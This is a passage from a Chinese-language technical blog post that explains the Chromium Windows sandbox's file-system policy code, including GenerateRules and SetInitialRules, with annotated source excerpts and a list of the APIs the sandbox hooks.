options,</span></span></span><br><span class="line"><span class="function"><span class="params">                                      <span class="keyword">int16_t</span> selected_param)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (memory_size() &lt; <span class="keyword">sizeof</span>(PolicyOpcode))</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// opcode从top开始向下占用buffer</span></span><br><span class="line">  PolicyOpcode* opcode = <span class="keyword">new</span> (memory_top_) PolicyOpcode();</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Fill in the standard fields, that every opcode has.</span></span><br><span class="line">  memory_top_ += <span class="keyword">sizeof</span>(PolicyOpcode);</span><br><span class="line">  opcode-&gt;opcode_id_ = opcode_id;<span class="comment">// 标记 opcode type</span></span><br><span class="line">  opcode-&gt;SetOptions(options);<span class="comment">// 标记 opcode options</span></span><br><span class="line">  <span class="comment">// 传入的selected_param表示用于和该PolicyOpcode比较的参数在ParameterSet中是第几个，也就是索引</span></span><br><span class="line">  opcode-&gt;parameter_ = selected_param;</span><br><span class="line">  <span class="keyword">return</span> opcode;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Filesystem"><a href="#Filesystem" class="headerlink" title="Filesystem"></a>Filesystem</h1><p>Target在执行5个文件系统相关的API时，会因为Interceptions的部署（该子系统由broker远程部署(service call)）而调用hook函数，hook函数通过SharedMem IPC与broker通信，将调用参数传给broker，broker此后通过dispatcher分发找到对应子系统的dispatcher，子系统dispatcher会匹配调用参数并调用一早便注册好的callback，callback会进行Low-level policy的Evaluate鉴权，并进一步调用low-level policy的业务处理函数，根据鉴权结果来执行API，并在CrossCallResult回执结果。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//chromium/sandbox/win/src/filesystem_policy.h</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileSystemPolicy</span> &#123;</span></span><br><span class="line"> <span class="keyword">public</span>:</span><br><span class="line">  <span class="comment">// 创建所需的低级策略规则来评估文件 IO 的高级策略规则，尤其是文件打开或创建操作。</span></span><br><span class="line">  <span class="comment">// &#x27;name&#x27; 是文件名或目录名。 “语义”。 </span></span><br><span class="line">  <span class="comment">// &#x27;semantics&#x27; 是打开或创建所需的语义</span></span><br><span class="line">  <span class="comment">//&#x27;policy&#x27; 是将要添加规则的策略生成器。</span></span><br><span class="line">  <span class="function"><span class="keyword">static</span> <span class="keyword">bool</span> <span class="title">GenerateRules</span><span class="params">(<span class="keyword">const</span> <span class="keyword">wchar_t</span>* name,</span></span></span><br><span class="line"><span class="function"><span class="params">                            TargetPolicy::Semantics semantics,</span></span></span><br><span class="line"><span class="function"><span class="params">                            LowLevelPolicy* policy)</span></span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Add basic file system rules.</span></span><br><span class="line">  <span class="function"><span class="keyword">static</span> <span class="keyword">bool</span> <span class="title">SetInitialRules</span><span class="params">(LowLevelPolicy* policy)</span></span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// IPC 收到 creat file 请求时的操作</span></span><br><span class="line">  <span class="comment">// &#x27;client_info&#x27; :发出请求的目标进程。</span></span><br><span class="line">  <span class="comment">// &#x27;eval_result&#x27; : 要完成的预期策略操作。</span></span><br><span class="line">  <span class="comment">// &#x27;file&#x27; : 目标文件或目录。</span></span><br><span class="line">  <span class="function"><span class="keyword">static</span> <span class="keyword">bool</span> <span class="title">CreateFileAction</span><span class="params">(EvalResult eval_result,</span></span></span><br><span class="line"><span class="function"><span class="params">                               <span class="keyword">const</span> ClientInfo&amp; client_info,</span></span></span><br><span class="line"><span class="function"><span class="params">                               <span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">wstring</span>&amp; file,</span></span></span><br><span class="line"><span class="function"><span class="params">                               <span class="keyword">uint32_t</span> attributes,</span></span></span><br><span class="line"><span class="function"><span class="params">                               <span class="keyword">uint32_t</span> desired_access,</span></span></span><br><span class="line"><span class="function"><span class="params">                               <span class="keyword">uint32_t</span> file_attributes,</span></span></span><br><span class="line"><span class="function"><span class="params">                               <span class="keyword">uint32_t</span> share_access,</span></span></span><br><span class="line"><span class="function"><span class="params">                               <span class="keyword">uint32_t</span> create_disposition,</span></span></span><br><span class="line"><span class="function"><span class="params">                               <span class="keyword">uint32_t</span> create_options,</span></span></span><br><span class="line"><span class="function"><span class="params">                               HANDLE* handle,</span></span></span><br><span class="line"><span class="function"><span class="params">                               NTSTATUS* nt_status,</span></span></span><br><span class="line"><span class="function"><span class="params">                               ULONG_PTR* io_information)</span></span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// IPC 收到 open file 请求时的操作</span></span><br><span class="line">  <span class="function"><span class="keyword">static</span> <span class="keyword">bool</span> <span class="title">OpenFileAction</span><span class="params">(EvalResult eval_result,</span></span></span><br><span class="line"><span class="function"><span class="params">                             <span class="keyword">const</span> ClientInfo&amp; client_info,</span></span></span><br><span class="line"><span class="function"><span class="params">                             <span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">wstring</span>&amp; file,</span></span></span><br><span class="line"><span class="function"><span class="params">                             <span class="keyword">uint32_t</span> attributes,</span></span></span><br><span class="line"><span class="function"><span class="params">                             <span class="keyword">uint32_t</span> desired_access,</span></span></span><br><span class="line"><span class="function"><span class="params">                             <span class="keyword">uint32_t</span> share_access,</span></span></span><br><span class="line"><span class="function"><span class="params">                             <span class="keyword">uint32_t</span> open_options,</span></span></span><br><span class="line"><span class="function"><span class="params">                             HANDLE* handle,</span></span></span><br><span class="line"><span class="function"><span class="params">                             NTSTATUS* nt_status,</span></span></span><br><span class="line"><span class="function"><span class="params">                             ULONG_PTR* io_information)</span></span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// IPC 收到 Query 请求时的操作</span></span><br><span class="line">  <span class="function"><span class="keyword">static</span> <span class="keyword">bool</span> <span class="title">QueryAttributesFileAction</span><span class="params">(EvalResult eval_result,</span></span></span><br><span class="line"><span class="function"><span class="params">                                        <span class="keyword">const</span> ClientInfo&amp; client_info,</span></span></span><br><span class="line"><span class="function"><span class="params">                                        <span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">wstring</span>&amp; file,</span></span></span><br><span class="line"><span class="function"><span class="params">                                        <span class="keyword">uint32_t</span> attributes,</span></span></span><br><span class="line"><span class="function"><span class="params">                                        FILE_BASIC_INFORMATION* file_info,</span></span></span><br><span class="line"><span class="function"><span class="params">                                        NTSTATUS* nt_status)</span></span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// IPC 收到 Query full请求时的操作</span></span><br><span class="line">  <span class="function"><span class="keyword">static</span> <span class="keyword">bool</span> <span class="title">QueryFullAttributesFileAction</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">      EvalResult eval_result,</span></span></span><br><span class="line"><span class="function"><span class="params">      <span class="keyword">const</span> ClientInfo&amp; client_info,</span></span></span><br><span class="line"><span class="function"><span class="params">      <span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">wstring</span>&amp; file,</span></span></span><br><span class="line"><span class="function"><span class="params">      <span class="keyword">uint32_t</span> attributes,</span></span></span><br><span class="line"><span class="function"><span class="params">      FILE_NETWORK_OPEN_INFORMATION* file_info,</span></span></span><br><span class="line"><span class="function"><span class="params">      NTSTATUS* nt_status)</span></span>;</span><br><span class="line">    </span><br><span class="line">  <span class="comment">// // IPC收到的set_info 请求时的操作</span></span><br><span class="line">  <span class="function"><span class="keyword">static</span> <span class="keyword">bool</span> <span class="title">SetInformationFileAction</span><span class="params">(EvalResult eval_result,</span></span></span><br><span class="line"><span class="function"><span class="params">                                       <span class="keyword">const</span> ClientInfo&amp; client_info,</span></span></span><br><span class="line"><span class="function"><span class="params">                                       HANDLE target_file_handle,</span></span></span><br><span class="line"><span class="function"><span class="params">                                       <span class="keyword">void</span>* file_info,</span></span></span><br><span class="line"><span class="function"><span class="params">                                       <span class="keyword">uint32_t</span> length,</span></span></span><br><span class="line"><span class="function"><span class="params">                                       <span class="keyword">uint32_t</span> info_class,</span></span></span><br><span class="line"><span class="function"><span class="params">                                       IO_STATUS_BLOCK* io_block,</span></span></span><br><span class="line"><span class="function"><span class="params">                                       NTSTATUS* nt_status)</span></span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>chrome的Windows版Sandbox是利用系统的</p><ul><li><p>user32!CreateDesktopW</p></li><li><p>kernel32!CreateJobObjectW</p></li><li><p>advapi32!CreateRestrictedToken</p></li><li><p>advapi32!CreateProcessAsUserW</p></li><li><p>advapi32!SetThreadToken</p></li><li><p>advapi32!RevertToSelf</p></li></ul><p>这些API为每个网页单独建立一个权限受限的renderer子进程专门用来解析网页, 如果网页有什么越轨的行为就销毁这个renderer子进程. 因为renderer子进程权限太低无法进行诸如下载上传文件这些操作, chrome改写了renderer子进程10个API, 如果参数合乎policy要求就让正常权限的browser主进程代为完成。</p><ul><li><p>ntdll!NtCreateFile</p></li><li><p>ntdll!NtOpenFile</p></li><li><p>ntdll!NtQueryAttributesFile</p></li><li><p>ntdll!NtQueryFullAttributesFile</p></li><li><p>ntdll!NtSetInformationFile</p></li><li><p>ntdll!NtOpenThread</p></li><li><p>ntdll!NtOpenProcess</p></li><li><p>ntdll!NtOpenProcessToken</p></li><li><p>ntdll!NtSetInformationThread</p></li><li><p>ntdll!NtOpenThreadToken</p></li></ul><h2 id="FileSystemPolicy-GenerateRules"><a href="#FileSystemPolicy-GenerateRules" class="headerlink" title="FileSystemPolicy::GenerateRules"></a>FileSystemPolicy::GenerateRules</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//chromium/sandbox/win/src/filesystem_policy.cc</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">FileSystemPolicy::GenerateRules</span><span class="params">(<span class="keyword">const</span> <span class="keyword">wchar_t</span>* name,</span></span></span><br><span class="line"><span class="function"><span class="params">                                     TargetPolicy::Semantics semantics,</span></span></span><br><span class="line"><span class="function"><span class="params">                                     LowLevelPolicy* policy)</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="built_in">std</span>::<span class="built_in">wstring</span> <span class="title">mod_name</span><span class="params">(name)</span></span>;</span><br><span class="line">  <span class="keyword">if</span> (mod_name.empty()) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//处理 mod_name。</span></span><br><span class="line">  <span class="keyword">if</span> (!PreProcessName(&amp;mod_name)) &#123;</span><br><span class="line">    <span class="comment">// The path to be added might contain a reparse point.</span></span><br><span class="line">    NOTREACHED();</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// TODO(cpu) bug 32224: This prefix add is a hack because we don&#x27;t have the</span></span><br><span class="line">  <span class="comment">// infrastructure to normalize names. In any case we need to escape the</span></span><br><span class="line">  <span class="comment">// question marks.</span></span><br><span class="line">  <span class="keyword">if</span> (_wcsnicmp(mod_name.c_str(), kNTDevicePrefix, kNTDevicePrefixLen)) &#123;</span><br><span class="line">    mod_name = FixNTPrefixForMatch(mod_name);</span><br><span class="line">    name = mod_name.c_str();</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// 设定 ASK_broker</span></span><br><span class="line">  EvalResult result = ASK_BROKER;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// List of supported calls for the filesystem.</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">unsigned</span> kCallNtCreateFile = <span class="number">0x1</span>;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">unsigned</span> kCallNtOpenFile = <span class="number">0x2</span>;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">unsigned</span> kCallNtQueryAttributesFile = <span class="number">0x4</span>;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">unsigned</span> kCallNtQueryFullAttributesFile = <span class="number">0x8</span>;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">unsigned</span> kCallNtSetInfoRename = <span class="number">0x10</span>;</span><br><span class="line"></span><br><span class="line">  DWORD rule_to_add = kCallNtOpenFile | kCallNtCreateFile |</span><br><span class="line">                      kCallNtQueryAttributesFile |</span><br><span class="line">                      kCallNtQueryFullAttributesFile | kCallNtSetInfoRename;</span><br><span class="line">  <span class="comment">//创建 5 个PolicyRule，分别管制5种请求，action为ASK_BROKER</span></span><br><span class="line">  <span class="function">PolicyRule <span class="title">create</span><span class="params">(result)</span></span>;</span><br><span class="line">  <span class="function">PolicyRule <span class="title">open</span><span class="params">(result)</span></span>;</span><br><span class="line">  <span class="function">PolicyRule <span class="title">query</span><span class="params">(result)</span></span>;</span><br><span class="line">  <span class="function">PolicyRule <span class="title">query_full</span><span class="params">(result)</span></span>;</span><br><span class="line">  <span class="function">PolicyRule <span class="title">rename</span><span class="params">(result)</span></span>;</span><br><span class="line">  <span class="comment">//根据不同的semantics，添加不同的 policy</span></span><br><span class="line">  <span class="keyword">switch</span> (semantics) &#123;</span><br><span class="line">    <span class="keyword">case</span> TargetPolicy::FILES_ALLOW_DIR_ANY: &#123;</span><br><span class="line">      open.AddNumberMatch(IF, OpenFile::OPTIONS, FILE_DIRECTORY_FILE, AND);</span><br><span class="line">      create.AddNumberMatch(IF, OpenFile::OPTIONS, FILE_DIRECTORY_FILE, AND);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">case</span> TargetPolicy::FILES_ALLOW_READONLY: &#123;</span><br><span class="line">      <span class="comment">// We consider all flags that are not known to be readonly as potentially</span></span><br><span class="line">      <span class="comment">// used for write.</span></span><br><span class="line">      DWORD allowed_flags = FILE_READ_DATA | FILE_READ_ATTRIBUTES |</span><br><span class="line">                            FILE_READ_EA | SYNCHRONIZE | FILE_EXECUTE |</span><br><span class="line">                            GENERIC_READ | GENERIC_EXECUTE | READ_CONTROL;</span><br><span class="line">      DWORD restricted_flags = ~allowed_flags;</span><br><span class="line">      open.AddNumberMatch(IF_NOT, OpenFile::ACCESS, restricted_flags, AND);</span><br><span class="line">      open.AddNumberMatch(IF, OpenFile::DISPOSITION, FILE_OPEN, EQUAL);</span><br><span class="line">      create.AddNumberMatch(IF_NOT, OpenFile::ACCESS, restricted_flags, AND);</span><br><span class="line">      create.AddNumberMatch(IF, OpenFile::DISPOSITION, FILE_OPEN, EQUAL);</span><br><span class="line"></span><br><span class="line">      <span class="comment">// Read only access don&#x27;t work for rename.</span></span><br><span class="line">      rule_to_add &amp;= ~kCallNtSetInfoRename;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">case</span> TargetPolicy::FILES_ALLOW_QUERY: &#123;</span><br><span class="line">      <span class="comment">// Here we don&#x27;t want to add policy for the open or the create.</span></span><br><span class="line">      rule_to_add &amp;=</span><br><span class="line">          ~(kCallNtOpenFile | kCallNtCreateFile | kCallNtSetInfoRename);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">case</span> TargetPolicy::FILES_ALLOW_ANY: &#123;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">default</span>: &#123;</span><br><span class="line">      NOTREACHED();</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 根据当前rule_to_add的状态，把OpenFile::NAME这一参数进行设置</span></span><br><span class="line">  <span class="comment">// PolicyRule add好以后，就通过policy-&gt;AddRule添加到LowLevelPolicy中</span></span><br><span class="line">  <span class="comment">// 注意AddRule时会绑定service id和PolicyRule</span></span><br><span class="line">  <span class="comment">// filesystem子系统占用了5个service id，分别对应open, create, rename, query, queryFull</span></span><br><span class="line">  <span class="keyword">if</span> ((rule_to_add &amp; kCallNtCreateFile) &amp;&amp;</span><br><span class="line">      (!create.AddStringMatch(IF, OpenFile::NAME, name, CASE_INSENSITIVE) ||</span><br><span class="line">       !policy-&gt;AddRule(IpcTag::NTCREATEFILE, &amp;create))) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((rule_to_add &amp; kCallNtOpenFile) &amp;&amp;</span><br><span class="line">      (!open.AddStringMatch(IF, OpenFile::NAME, name, CASE_INSENSITIVE) ||</span><br><span class="line">       !policy-&gt;AddRule(IpcTag::NTOPENFILE, &amp;open))) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((rule_to_add &amp; kCallNtQueryAttributesFile) &amp;&amp;</span><br><span class="line">      (!query.AddStringMatch(IF, FileName::NAME, name, CASE_INSENSITIVE) ||</span><br><span class="line">       !policy-&gt;AddRule(IpcTag::NTQUERYATTRIBUTESFILE, &amp;query))) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((rule_to_add &amp; kCallNtQueryFullAttributesFile) &amp;&amp;</span><br><span class="line">      (!query_full.AddStringMatch(IF, FileName::NAME, name, CASE_INSENSITIVE) ||</span><br><span class="line">       !policy-&gt;AddRule(IpcTag::NTQUERYFULLATTRIBUTESFILE, &amp;query_full))) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((rule_to_add &amp; kCallNtSetInfoRename) &amp;&amp;</span><br><span class="line">      (!rename.AddStringMatch(IF, FileName::NAME, name, CASE_INSENSITIVE) ||</span><br><span class="line">       !policy-&gt;AddRule(IpcTag::NTSETINFO_RENAME, &amp;rename))) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>以下是调用的实例：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//chromium/sandbox/win/src/sandbox_policy_base.cc</span></span><br><span class="line"><span class="function">ResultCode <span class="title">PolicyBase::AddRuleInternal</span><span class="params">(SubSystem subsystem,</span></span></span><br><span class="line"><span class="function"><span class="params">                                       Semantics semantics,</span></span></span><br><span class="line"><span class="function"><span class="params">                                       <span class="keyword">const</span> <span class="keyword">wchar_t</span>* pattern)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (!policy_) &#123;</span><br><span class="line">     <span class="comment">// 如果policy_未被设置，make一个4096*14尺寸的PolicyGlobal</span></span><br><span class="line">    policy_ = MakeBrokerPolicyMemory();</span><br><span class="line">    DCHECK(policy_);</span><br><span class="line">     <span class="comment">// 使用该PolicyGlobal new出一个LowLevelPolicy</span></span><br><span class="line">    policy_maker_ = <span class="keyword">new</span> LowLevelPolicy(policy_);</span><br><span class="line">    DCHECK(policy_maker_);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">switch</span> (subsystem) &#123;</span><br><span class="line">    <span class="keyword">case</span> SUBSYS_FILES: &#123;</span><br><span class="line">      <span class="keyword">if</span> (!file_system_init_) &#123; <span class="comment">//确定 filesystem 被初始化，一开始file_system_init_是false</span></span><br><span class="line">        <span class="keyword">if</span> (!FileSystemPolicy::SetInitialRules(policy_maker_))</span><br><span class="line">            <span class="comment">// 执行完SetInitialRules后，file_system_init_置true，即SetInitialRules只执行一次</span></span><br><span class="line">          <span class="keyword">return</span> SBOX_ERROR_BAD_PARAMS;</span><br><span class="line">        file_system_init_ = <span class="literal">true</span>;</span><br><span class="line">      &#125;</span><br><span class="line">        <span class="comment">// 根据传入的pattern,semantics，用LowLevelPolicy生成一个rule</span></span><br><span class="line">      <span class="keyword">if</span> (!FileSystemPolicy::GenerateRules(pattern, semantics, policy_maker_)) &#123;</span><br><span class="line">        NOTREACHED();</span><br><span class="line">        <span class="keyword">return</span> SBOX_ERROR_BAD_PARAMS;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">    ...</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> SBOX_ALL_OK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="FileSystemPolicy-SetInitialRules"><a href="#FileSystemPolicy-SetInitialRules" class="headerlink" title="FileSystemPolicy::SetInitialRules()"></a>FileSystemPolicy::SetInitialRules()</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">FileSystemPolicy::SetInitialRules</span><span class="params">(LowLevelPolicy* policy)</span> </span>&#123;</span><br><span class="line">  <span class="function">PolicyRule <span class="title">format</span><span class="params">(ASK_BROKER)</span></span>;</span><br><span class="line">  <span class="function">PolicyRule <span class="title">short_name</span><span class="params">(ASK_BROKER)</span></span>;</span><br><span class="line">  <span class="comment">// 两个ASK_BROKER的action rule</span></span><br><span class="line">    </span><br><span class="line">  <span class="keyword">bool</span> rv = format.AddNumberMatch(IF_NOT, FileName::BROKER, BROKER_TRUE, AND);</span><br><span class="line">  rv &amp;= format.AddStringMatch(IF_NOT, FileName::NAME, <span class="string">L&quot;\\/?/?\\*&quot;</span>,</span><br><span class="line">                              CASE_SENSITIVE);</span><br><span class="line">  <span class="comment">// format按位与匹配FileName::BROKER没有BROKER_TRUE标志位</span></span><br><span class="line">  rv &amp;= short_name.AddNumberMatch(IF_NOT, FileName::BROKER, BROKER_TRUE, AND);</span><br><span class="line">  <span class="comment">// 匹配FileName::NAME不能为L&quot;\\/?/?\\*&quot;</span></span><br><span class="line">  rv &amp;= short_name.AddStringMatch(IF, FileName::NAME, <span class="string">L&quot;*~*&quot;</span>, CASE_SENSITIVE);</span><br><span class="line">    </span><br><span class="line">  <span class="comment">// 为5个service id，各添加这两个rule到LowLevelPolicy</span></span><br><span class="line">  <span class="keyword">if</span> (!rv || !policy-&gt;AddRule(IpcTag::NTCREATEFILE, &amp;format))</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!policy-&gt;AddRule(IpcTag::NTCREATEFILE, &amp;short_name))</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!policy-&gt;AddRule(IpcTag::NTOPENFILE, &amp;format))</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!policy-&gt;AddRule(IpcTag::NTOPENFILE, &amp;short_name))</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!policy-&gt;AddRule(IpcTag::NTQUERYATTRIBUTESFILE, &amp;format))</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!policy-&gt;AddRule(IpcTag::NTQUERYATTRIBUTESFILE, &amp;short_name))</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!policy-&gt;AddRule(IpcTag::NTQUERYFULLATTRIBUTESFILE, &amp;format))</span><br><span class="line">    <span class="keyword">return</span> <span 